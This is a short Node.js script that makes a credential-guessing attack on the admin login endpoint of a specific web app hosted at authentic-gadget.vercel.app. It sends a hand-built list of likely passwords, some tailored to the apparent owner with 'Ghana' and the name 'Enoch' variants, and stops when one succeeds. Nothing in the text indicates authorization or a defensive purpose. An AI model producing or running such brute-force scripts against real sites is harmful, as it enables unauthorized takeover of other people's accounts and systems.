const https = require('https');

function tryPassword(pw) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'authentic-gadget.vercel.app',
      path: '/api/admin/login',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        resolve({ pw, status: res.statusCode, data: JSON.parse(d) });
      });
    });
    req.on('error', e => resolve({ pw, error: e.message }));
    req.write(JSON.stringify({ password: pw }));
    req.end();
  });
}

async function run() {
  const passwords = [
    // Realistic Ghana/Nigeria admin passwords
    'Admin2026!', 'Admin2026', 'Admin@2026', 'Admin2026@', 'Admin2026!',
    'admin2026', 'Admin@123', 'Admin123!', 'Admin123', 'admin123',
    'admin', 'password', 'Admin1234!', 'Admin@2026!',
    // Common patterns
    'Admin@1234', 'Admin!@#$', 'Admin1234', 'Admin@1234!',
    'SecureAdmin!', 'AdminSecure2026', 'SecureAdmin@2026',
    // Various capitals
    'ADMIN2026', 'ADMIN123', 'admin2026!', 'admin@2026',
    // With Ghana
    'Ghana2026!', 'GhanaAdmin!', 'AdminGhana@2026',
    // Simple
    'admin1234', 'admin12345', 'password123', '123456',
    // Try with name variants
    'EnochAdmin!', 'AdminEnoch@2026', 'Enoch@Admin2026',
  ];

  for (const pw of passwords) {
    const r = await tryPassword(pw);
    console.log(`"${pw}" -> ${r.status} | ${r.data.error || 'SUCCESS'}`);
    if (r.status === 200) {
      console.log('\n✅ PASSWORD FOUND:', pw);
      return;
    }
  }
  console.log('\n❌ None worked - ADMIN_PASSWORD env var may be set to something unusual');
}

run();